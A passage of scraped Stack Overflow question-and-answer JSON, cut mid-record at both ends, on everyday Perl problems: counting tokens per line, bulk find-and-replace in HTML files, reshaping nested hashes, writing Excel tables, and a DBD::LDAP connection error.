43978026, "question_id": 43973831, "link": "https://stackoverflow.com/questions/43973831/counting-specific-element-line-by-line/43978026#43978026", "title": "Counting specific element line by line", "body": "<p>This counts the number of <code>NN</code>s on a line and skips lines that contain <code>NN</code>s:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nwhile (my $line = &lt;DATA&gt;) {\n    if (my $number_of_nn = (() = $line =~ /(NN)/g)) {\n        print \"Number of NN is $number_of_nn\\n\";\n    }\n    else {\n        print $line;\n    }\n}\n\n__DATA__\nQcode   B_32_ISO.GT     B_45_ISO.GT     B_63_ISO.GT     B_72_ISO.GT     B_85_ISO.GT     B_89_ISO.GT     B_9_I\nNN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8012816, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efcf99bd843b37a8f71a94f669139736?s=128&d=identicon&r=PG&f=1", "display_name": "Sandip", "link": "https://stackoverflow.com/users/8012816/sandip"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 39, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1494846825, "creation_date": 1494833926, "last_edit_date": 1494838459, "question_id": 43973831, "link": "https://stackoverflow.com/questions/43973831/counting-specific-element-line-by-line", "title": "Counting specific element line by line", "body": "<p>I would like to count number of occurrence of <code>NN</code> in each line and then remove lines containing with more occurrences of <code>NN</code>. I wrote a script to count the occurrence line by line, but its not giving the desired output. </p>\n\n<h3>Input:</h3>\n\n<pre><code>Qcode   B_32_ISO.GT     B_45_ISO.GT     B_63_ISO.GT     B_72_ISO.GT     B_85_ISO.GT     B_89_ISO.GT     B_9_I\nNN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN      NN\n</code></pre>\n\n<h3>Perl</h3>\n\n<pre><code>#!/usr/bin/perl\n\nopen( In,  \"$ARGV[0]\" );\nopen( Out, \"&gt;$ARGV[1]\" );\n\n%count;\n\nwhile ( $line = &lt;In&gt; ) {\n\n    chomp( $line );\n\n    if ( $line =~ /rs#/ ) {\n        print Out \"$line\\n\";\n        next;\n    }\n\n    @arr = split( /\\t/, $line );\n\n    for ( $i = 11; $i &lt;= $#arr; $i++ ) {\n        $count{ $arr[$i] }++;\n    }\n\n    while ( my ( $key, $value ) = each( %count ) ) {\n        print \"$key:$value\\n\";\n    }\n}\n\nclose In;\nclose Out;\n</code></pre>\n\n<h3>Output :</h3>\n\n<pre><code>TT:2\nNN:538\nAC:2\nAA:6\n\nTT:2\nNN:1070\nAC:2\nCC:6\nAA:6\nTT:3\nCT:1\n</code></pre>\n\n<p>I want to count the occurrence in each line instead of summing for all lines.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1494922332, "post_id": 43973630, "comment_id": 75020241, "body": "Why without using File::Find? File::Find has been a standard part of the Perl distribution for over twenty years. There&#39;s no reason to avoid it."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1494856719, "post_id": 43973751, "comment_id": 74991867, "body": "Use <code>glob &quot;\\Q$s\\E&#47;.* \\Q$s\\E&#47;*&quot;</code> if you also want to scan &quot;hidden&quot; files and directories."}, {"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494857035, "post_id": 43973751, "comment_id": 74992092, "body": "@ikegami Can you explain the use of <code>--</code> in the above one liner?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494857179, "post_id": 43973751, "comment_id": 74992189, "body": "Denotes the ends of options. It makes it so values of <code>$ma</code> that start with <code>-</code> won&#39;t be treated as options. Admittedly, it won&#39;t happen in that program (since all paths start with <code>ka&#47;</code>), but it&#39;s a good habit."}], "tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": true, "score": 1, "last_activity_date": 1494856684, "last_edit_date": 1494856684, "creation_date": 1494833603, "answer_id": 43973751, "question_id": 43973630, "link": "https://stackoverflow.com/questions/43973630/how-to-rename-the-word-from-anywhere-under-my-html-files-without-using-filefi/43973751#43973751", "title": "How to rename the word from anywhere under my .html files without using File::Find in perl?", "body": "<p>Try this</p>\n\n<pre><code>my $path = \"ka/\";\nfind($path);\nsub find{\n    my ($s) = @_;\n    foreach my $ma (glob \"\\Q$s\\E/*\")\n    {\n      if(-f $ma &amp;&amp; $ma =~ m/\\.html\\z/)\n      {\n        system('perl', '-i', '-pe', 's/tevision/ev/', '--', $ma);\n      }\n      elsif(-d $ma)\n      {\n        find($ma)\n      }\n\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1494857036, "last_edit_date": 1494857036, "creation_date": 1494834989, "answer_id": 43974139, "question_id": 43973630, "link": "https://stackoverflow.com/questions/43973630/how-to-rename-the-word-from-anywhere-under-my-html-files-without-using-filefi/43974139#43974139", "title": "How to rename the word from anywhere under my .html files without using File::Find in perl?", "body": "<p>Inside the subroutine that is called by File::Find, the <code>$_</code> variable will contain the <strong>name</strong> of the file that has been found. Your code seems to think it will contain the contents of the file. To get the contents of the file, you will need to open the file and read the contents. Then you will need to make your conversions and write the altered contents back to the original file.</p>\n\n<p>This is all far easier using a combination of the Unix <code>find</code> command and Perl's command-line options. It probably helps to work out the solution for a single file and then use <code>find</code> to execute that command on all of the required files.</p>\n\n<pre><code>$ perl -i -pe 's/tevision/ev/' some_file.html\n</code></pre>\n\n<p>This takes a file (some_file.html), opens it and processes the file.</p>\n\n<ul>\n<li>-i : this writes the converted input back to the original file</li>\n<li>-p : this loops round all the lines in the file. Each one, in turn, is stored in <code>$_</code> and the contents of <code>$_</code> are printed after each iteration of the loop.</li>\n<li>-e : this is the code you want to run for each line of the file.</li>\n</ul>\n\n<p>We can then put that into a <code>find</code> command to get the full behaviour that you want.</p>\n\n<pre><code>$ find . -name \"*.html\" -exec perl -i -pe 's/tevision/ev/' {} \\;\n</code></pre>\n\n<p>The following are more efficient because they don't launch as many instances of <code>perl</code>:</p>\n\n<pre><code>$ find . -name \"*.html\" -exec perl -i -pe 's/tevision/ev/' {} +   # Requires GNU find\n\n$ find . -name \"*.html\" -print0 | xargs -0 perl -i -pe 's/tevision/ev/'\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7989792"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 43973751, "answer_count": 2, "score": 1, "last_activity_date": 1494857036, "creation_date": 1494833106, "question_id": 43973630, "link": "https://stackoverflow.com/questions/43973630/how-to-rename-the-word-from-anywhere-under-my-html-files-without-using-filefi", "title": "How to rename the word from anywhere under my .html files without using File::Find in perl?", "body": "<hr>\n\n<p>Here is my query the following is my directory structure .</p>\n\n<pre><code>`-- ka\n    |-- ka.html\n    `-- ka_tal\n        |-- tal_cation\n        |   |-- tal_cation.html\n        |   `-- ev1\n        |       `--ka_ka_tal_tal_cation_v1.html\n        |\n        `-- ka_tal.html\n</code></pre>\n\n<p>Here every .html files have the word named as tevision i want to rename all words tevision to ev.so i had tried the  following code.But it not works for me.</p>\n\n<pre><code> finddepth(sub {\n\n  return unless -d;\n\n  (my $new = $_) =~ s/tevision/ev/ or return;\n  rename $_, $new or warn \"Err renaming $_ to $new in $File::Find::dir: $!\";\n}, \".\");\n</code></pre>\n\n<p>How can i rename all words inside .html files using perl?</p>\n"}, {"tags": ["perl", "hash"], "comments": [{"owner": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "edited": false, "score": 0, "creation_date": 1494830075, "post_id": 43972663, "comment_id": 74975430, "body": "One, but not nice way is to save the key1 as tmp. Then delete the key from the hash. At in the ende create an new key from the tmp. Maybe so: my $tmp = $hash_name-&gt;{key1}; delete $hash_name-&gt;{key1}; $hash_name-&gt;{x} = $tmp."}, {"owner": {"reputation": 205, "user_id": 4770887, "user_type": "registered", "accept_rate": 30, "profile_image": "https://lh3.googleusercontent.com/-T3zRs7dM69A/AAAAAAAAAAI/AAAAAAAAABA/8b0xU0_DWdM/photo.jpg?sz=128", "display_name": "aayu5h", "link": "https://stackoverflow.com/users/4770887/aayu5h"}, "reply_to_user": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "edited": false, "score": 0, "creation_date": 1494830719, "post_id": 43972663, "comment_id": 74975776, "body": "But I don&#39;t want key1 at all. I want the value of the key in the 3rd hash as the new key1."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494846999, "post_id": 43972663, "comment_id": 74985319, "body": "This is a good time to ask yourself how you ended up with this data structure instead of the data structure you wanted, and step back and find a way to end up with the data structure you wanted rather than the data structure you ended up with."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1494836167, "creation_date": 1494836167, "answer_id": 43974467, "question_id": 43972663, "link": "https://stackoverflow.com/questions/43972663/how-to-restructure-hash-of-hashes-of-hashes/43974467#43974467", "title": "How to restructure hash of hashes of hashes?", "body": "<p>Like this, perhaps?</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Data::Dump;\n\nmy $hash_1 = {\n  hash_2 =&gt; {\n    a1 =&gt; { 1 =&gt; \"m\", 2 =&gt; \"x\", 3 =&gt; \"n\" },\n    a2 =&gt; { 1 =&gt; \"a\", 2 =&gt; \"x\", 3 =&gt; \"b\" },\n    a3 =&gt; { 1 =&gt; \"c\", 2 =&gt; \"y\", 3 =&gt; \"d\" },\n    a4 =&gt; { 1 =&gt; \"i\", 2 =&gt; \"y\", 3 =&gt; \"j\" },\n  }\n};\n\n{\n    my $data = delete $hash_1-&gt;{hash_2};\n\n    for my $key ( keys %$data ) {\n        my $item = $data-&gt;{$key};\n        $hash_1-&gt;{ $item-&gt;{2} }{ $key } = $item;\n    }\n}\n\ndd $hash_1;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>{\n  x =&gt; {\n         a1 =&gt; { 1 =&gt; \"m\", 2 =&gt; \"x\", 3 =&gt; \"n\" },\n         a2 =&gt; { 1 =&gt; \"a\", 2 =&gt; \"x\", 3 =&gt; \"b\" },\n       },\n  y =&gt; {\n         a3 =&gt; { 1 =&gt; \"c\", 2 =&gt; \"y\", 3 =&gt; \"d\" },\n         a4 =&gt; { 1 =&gt; \"i\", 2 =&gt; \"y\", 3 =&gt; \"j\" },\n       },\n}\n</code></pre>\n"}], "owner": {"reputation": 205, "user_id": 4770887, "user_type": "registered", "accept_rate": 30, "profile_image": "https://lh3.googleusercontent.com/-T3zRs7dM69A/AAAAAAAAAAI/AAAAAAAAABA/8b0xU0_DWdM/photo.jpg?sz=128", "display_name": "aayu5h", "link": "https://stackoverflow.com/users/4770887/aayu5h"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1494856817, "creation_date": 1494829212, "last_edit_date": 1495541896, "question_id": 43972663, "link": "https://stackoverflow.com/questions/43972663/how-to-restructure-hash-of-hashes-of-hashes", "title": "How to restructure hash of hashes of hashes?", "body": "<p>I have a hash of hash of hash as </p>\n\n<pre><code>hash_1 =&gt;{\n           hash_2=&gt;{\n               a1 =&gt; {           \n                      1 =&gt; m,\n                      2 =&gt; x,\n                      3 =&gt; n\n                     },\n               a2 =&gt;  {\n                      1 =&gt; a,\n                      2 =&gt; x,\n                      3 =&gt; b\n                      },\n                a3 =&gt;  {\n                      1 =&gt; c,\n                      2 =&gt; y,\n                      3 =&gt; d\n                      },\n                a4 =&gt;  {\n                      1 =&gt; i,\n                      2 =&gt; y,\n                      3 =&gt; j\n                      },\n             },\n         };\n</code></pre>\n\n<p>Now I want to delete the key \"hash_2\" and and add new keys in place of \"hash_2\" which depends on the value of the key \"2\" inside each hashes a1, a2, a3... So, like here we have two different values for the key \"2\" : x and y. So I want this values to be in place of the key of the first hash \"hash_2\" and create a new hash map altogether.\nSo end result should be :</p>\n\n<pre><code>  hash_1 =&gt;{\n           x=&gt;{\n               a1 =&gt; {           \n                      1 =&gt; m,\n                      2 =&gt; x,\n                      3 =&gt; n\n                     },\n               a2 =&gt;  {\n                      1 =&gt; a,\n                      2 =&gt; x,\n                      3 =&gt; b\n                      },\n              },\n            y =&gt; {\n                a3 =&gt;  {\n                      1 =&gt; c,\n                      2 =&gt; y,\n                      3 =&gt; d\n                      },\n                a4 =&gt;  {\n                      1 =&gt; i,\n                      2 =&gt; y,\n                      3 =&gt; j\n                      },\n             },\n         };\n</code></pre>\n\n<p>I checked <a href=\"https://stackoverflow.com/questions/1490356/how-to-replace-a-perl-hash-key\">How to replace a Perl hash key?</a> but could not get how to make a value of a key as a key.\nI tried deleting the hash_2 but was not successful(using the delete keyword).\nThanks.</p>\n"}, {"tags": ["excel", "perl", "xlsx"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494825429, "post_id": 43971841, "comment_id": 74973734, "body": "If you are looking for help with debugging code see <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">ericlippert.com/2014/03/05/how-to-debug-small-programs</a>"}, {"owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494826056, "post_id": 43971841, "comment_id": 74973935, "body": "I am not looking for someone to debug my code, i want to know  whether there is a functionality that i can use @Yunnosch"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494826923, "post_id": 43971841, "comment_id": 74974268, "body": "Edit your question, it is hard to read and currently seems (to me) to describe a problem which you have with the given code. The question whether this code would do what you want can be answered by trying it, can&#39;t it?"}], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "edited": false, "score": 0, "creation_date": 1494840591, "post_id": 43974199, "comment_id": 74981242, "body": "It doesn&#39;t work even if i use &#39;A:G&#39; or &#39;A2:G8&#39; for the successive one."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "edited": false, "score": 0, "creation_date": 1494841603, "post_id": 43974199, "comment_id": 74981928, "body": "@kewin: Presumably you&#39;ll need to move the coordinates by at least the size of the table. It won&#39;t automatically put the new data out of the way of any existing contents."}, {"owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "edited": false, "score": 0, "creation_date": 1494846251, "post_id": 43974199, "comment_id": 74984844, "body": ":how can i increment the size"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1494835226, "creation_date": 1494835226, "answer_id": 43974199, "question_id": 43971841, "link": "https://stackoverflow.com/questions/43971841/unable-to-add-new-rows-in-an-excel-file-using-xlsx-module-in-perl/43974199#43974199", "title": "unable to add new rows in an excel file using xlsx module in perl", "body": "<p>Your code writes the table at <code>A1:G8</code> each time. You need to change that if you want the tables in different places.</p>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "edited": false, "score": 0, "creation_date": 1494904746, "post_id": 43984900, "comment_id": 75012680, "body": "no you got me wrong, the $data is not provided beforehand i have an outer loop which i have not included ,that basically gets the design information and stores it again in the $data,  the for loop which adds table should append the $data in the next line , i should not include it beforehand in the $data variable .    The my $data = [[ $server, $domain ,$backup],    ]; should remain the same , i am trying to automate not add manually."}], "tags": [], "owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "is_accepted": false, "score": 0, "last_activity_date": 1494867009, "creation_date": 1494867009, "answer_id": 43984900, "question_id": 43971841, "link": "https://stackoverflow.com/questions/43971841/unable-to-add-new-rows-in-an-excel-file-using-xlsx-module-in-perl/43984900#43984900", "title": "unable to add new rows in an excel file using xlsx module in perl", "body": "<p>Seems to work for me using sample data:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Excel::Writer::XLSX;\n\nmy $workbook = Excel::Writer::XLSX-&gt;new('ke.xlsx' );#create the excel\n\nmy $worksheet = $workbook-&gt;add_worksheet(); \n\n#my $server= \"se\";\n#my $domain  = \"de\";\n#my $backup = \"b\";\n\n# Some sample data for the table.\n#my $data = [[ $server, $domain ,$backup],\n#   ];\n\nmy $data = [ [\"se\", \"de\",\"b\"],\n             [\"ll\", \"pp\",\"t\"],\n             [\"yu\", \"ar\",\"e\"],\n             [\"gt\", \"po\",\"w\"],\n             [\"br\", \"tp\",\"g\"] ];\n$worksheet-&gt;set_column( 'A:G', 20 );\n\nfor(my $i = 0 ;$i&lt;2;$i++){\n     $worksheet-&gt;add_table(   # Add a table to the worksheet.\n    'A1:G8',\n    {\n       data      =&gt; $data,\n        total_row =&gt; 1,\n        columns   =&gt; [\n            { \n                header =&gt; 'server name', \n            },\n\n            {\n                header =&gt; 'Domain Name',\n            },\n            {\n                header =&gt; 'Back Up address',\n            }\n        ]\n    }\n);\n\n}\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/voEdY.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/voEdY.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 34, "user_id": 6389195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/861fcb9c34cf8692c3c73a69d35b86a7?s=128&d=identicon&r=PG&f=1", "display_name": "max", "link": "https://stackoverflow.com/users/6389195/max"}, "is_accepted": false, "score": 0, "last_activity_date": 1494920698, "creation_date": 1494920698, "answer_id": 43995350, "question_id": 43971841, "link": "https://stackoverflow.com/questions/43971841/unable-to-add-new-rows-in-an-excel-file-using-xlsx-module-in-perl/43995350#43995350", "title": "unable to add new rows in an excel file using xlsx module in perl", "body": "<p>I have worked on this module, however we did not used add_table instead we used $worksheet->write_row.\nI think you should try writing your data using write_row\n<a href=\"https://metacpan.org/pod/Excel::Writer::XLSX\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/Excel::Writer::XLSX</a></p>\n\n<p>If you don't want to use write_row, then for more examples on add_table please visit : <a href=\"https://metacpan.org/pod/Excel::Writer::XLSX#TABLES-IN-EXCEL\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/Excel::Writer::XLSX#TABLES-IN-EXCEL</a></p>\n\n<p>Hope that helps :)</p>\n"}], "owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 161, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1494920698, "creation_date": 1494824392, "last_edit_date": 1494828899, "question_id": 43971841, "link": "https://stackoverflow.com/questions/43971841/unable-to-add-new-rows-in-an-excel-file-using-xlsx-module-in-perl", "title": "unable to add new rows in an excel file using xlsx module in perl", "body": "<p>i am trying to append new rows in an excel file, only the last data is present , since it overwrites any previous data written , in this code i have a for loop that loops again to write the same data in a second row but , instead it rewrites the existing data</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Excel::Writer::XLSX;\n\nmy $workbook    = Excel::Writer::XLSX-&gt;new( 'ke.xlsx' );#create the excel\n\nmy $worksheet = $workbook-&gt;add_worksheet(); \n\nmy $server= \"se\";\nmy $domain  = \"de\";\nmy $backup = \"b\";\n\n\n\n# Some sample data for the table.\nmy $data = [[ $server, $domain ,$backup],\n   ];\n$worksheet-&gt;set_column( 'A:G', 20 );\n\nfor(my $i = 0 ;$i&lt;2;$i++){\n     $worksheet-&gt;add_table(   # Add a table to the worksheet.\n    'A1:G8',\n    {\n       data      =&gt; $data,\n        total_row =&gt; 1,\n        columns   =&gt; [\n            { \n\n                header =&gt; 'server name', \n            },\n\n            {\n                header         =&gt; 'Domain Name',\n\n\n            },\n            {\n                header         =&gt; 'Back Up address',\n\n\n            }\n        ]\n    }\n);\n\n}\n</code></pre>\n"}, {"tags": ["linux", "perl", "ldap"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1494828347, "post_id": 43970840, "comment_id": 74974776, "body": "Are you sure that you are using correct db name? Because it clearly giving the <b>Database not found error</b>."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1494834862, "creation_date": 1494834862, "answer_id": 43974113, "question_id": 43970840, "link": "https://stackoverflow.com/questions/43970840/use-perl-to-connect-oracle-with-ldap/43974113#43974113", "title": "use perl to connect oracle with LDAP", "body": "<p>At a guess, you haven't created the configuration file <code>dbase123456.ldb</code></p>\n\n<p>Take a look at <a href=\"http://search.cpan.org/dist/DBD-LDAP/lib/DBD/LDAP.pm#GETTING_STARTED:\" rel=\"nofollow noreferrer\"><em>GETTING STARTED</em> from the documentation for the <code>DBD::LDAP</code> driver</a></p>\n"}], "owner": {"reputation": 1, "user_id": 5541611, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d13d7575320cddaba3b10cf719d8dc00?s=128&d=identicon&r=PG&f=1", "display_name": "CYang.H", "link": "https://stackoverflow.com/users/5541611/cyang-h"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 263, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1494834862, "creation_date": 1494815963, "last_edit_date": 1494828667, "question_id": 43970840, "link": "https://stackoverflow.com/questions/43970840/use-perl-to-connect-oracle-with-ldap", "title": "use perl to connect oracle with LDAP", "body": "<p>I want to connect oracle db by perl with LDAP, but I got below issue:</p>\n\n<p>No such database (dbase123456)! at /home/cy/scripts/test/lib/DBD/LDAP.pm line 401,  line 253.\nDBI connect('dbase123456','cy',...) failed: No such database (dbase123456)! at ./test.pl line 28\nCan't call method \"prepare\" on an undefined value at ./test.pl line 29,  line 253.</p>\n\n<p>The perl scripst are:</p>\n\n<pre><code>my $query = GetQuery();\n\nmy $dbh = DBI-&gt;connect(\"DBI:LDAP:dbase123456\",'cy','cy');\n\nmy $sth = $dbh-&gt;prepare($query);\n\n$sth-&gt;execute();\n\nmy $rows_ = $sth-&gt;fetchall_arrayref();\n\n$sth-&gt;finish();\n</code></pre>\n\n<p>Please someone help me to check the root cause, thanks a lot.</p>\n"}, {"tags": ["perl", "gnuplot"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494786025, "post_id": 43966881, "comment_id": 74964691, "body": "See the <a href=\"http://gnuplot.sourceforge.net/demo/datastrings.5.gnu\" rel=\"nofollow noreferrer\">datastrings demo</a>."}, {"owner": {"reputation": 483, "user_id": 4775890, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/26ba77b7e154380c4bd69a1c105eb160?s=128&d=identicon&r=PG&f=1", "display_name": "Angelos", "link": "https://stackoverflow.com/users/4775890/angelos"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494787313, "post_id": 43966881, "comment_id": 74965078, "body": "@Sinan&#220;n&#252;r how can I add this feature to the Perl code?"}, {"owner": {"reputation": 4163, "user_id": 6401403, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5e6e113b3335b200f4d4946e1bcaff84?s=128&d=identicon&r=PG&f=1", "display_name": "Michael O.", "link": "https://stackoverflow.com/users/6401403/michael-o"}, "edited": false, "score": 0, "creation_date": 1494790277, "post_id": 43966881, "comment_id": 74965927, "body": "In similar cases I just form 